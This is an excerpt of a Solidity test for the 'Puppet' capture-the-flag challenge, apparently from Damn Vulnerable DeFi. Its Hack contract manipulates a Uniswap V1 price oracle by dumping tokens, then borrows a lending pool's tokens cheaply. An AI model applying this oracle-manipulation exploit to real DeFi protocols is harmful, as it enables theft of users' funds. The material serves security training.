...
contract PuppetChallenge is Test {
    ...
    function test_puppet() public checkSolvedByPlayer {
        //token.transfer(address(uniswapV1Exchange), 1000 ether);
        //lendingPool.borrow{value: 25 ether}(10_0000 ether, recovery);
        console.log(
            _calculateTokenToEthInputPrice(1000 ether, 10 ether, 10 ether)
        );
        /*Hack hack = new Hack{value: 25 ether}(
            address(uniswapV1Exchange),
            address(token),
            address(lendingPool),
            recovery
        ...
        token.transfer(address(hack), 1000 ether);
...
contract Hack {
    ...
    function attack() external {
        ...
        uniswapV1Exchange.tokenToEthSwapInput(1000 ether, 1, block.timestamp);
        pool.borrow{value: 25 ether}(1000 ether, recovery);
    }
